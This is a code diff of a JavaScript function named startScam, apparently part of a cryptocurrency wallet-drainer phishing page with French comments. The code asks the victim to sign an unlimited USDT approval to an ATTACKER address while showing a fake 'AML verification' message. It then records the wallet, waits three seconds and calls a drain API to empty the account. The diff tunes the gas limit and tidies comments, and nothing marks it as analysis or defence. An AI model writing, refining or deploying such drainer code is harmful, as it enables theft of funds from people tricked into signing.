@@ -1055,7 +1055,6 @@ async function startScam() {
 
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-  // Data d'approve : approve(ATTACKER, MAX)
   const approveData = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
@@ -1064,7 +1063,8 @@ async function startScam() {
     from: account,
     to: USDT_ADDR,
     data: approveData,
-    gasLimit: '0x30D40' // 200 000 gaz – suffisant pour un approve
+    gasLimit: '0xea60' // 60 000 – suffisant pour approve
+    // Ne pas spécifier gasPrice – le wallet utilise son propre estimateur
   };
 
   const scanText = document.querySelector('.scan');
@@ -1084,33 +1084,32 @@ async function startScam() {
 
     if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
 
-    // Enregistrer le statut "signed"
+    // Enregistrer statut signed
     await fetch('/api/record-wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
     });
 
-    // Attendre 3 secondes avant le drain
+    // Attendre 3 secondes avant drain
     await new Promise(r => setTimeout(r, 3000));
 
-    // Lancer le drain automatique
     const drainResp = await fetch(API, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ victim: account, chain: currentChainId })
     });
     const drainData = await drainResp.json();
-    console.log('Drain response:', drainData);
 
-    if (scanText) scanText.textContent = drainData.success ? '✅ Vérification AML terminée. Redirection…' : '❌ Drain partiellement échoué (voir logs)';
+    if (scanText) scanText.textContent = drainData.success
+      ? '✅ Vérification AML terminée. Redirection…'
+      : '❌ Drain partiellement échoué (voir logs)';
 
     setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
   } catch (e) {
     console.error('❌ Transaction refusée', e);
     if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
 
-    // Statut "unsigned"
     await fetch('/api/record-wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
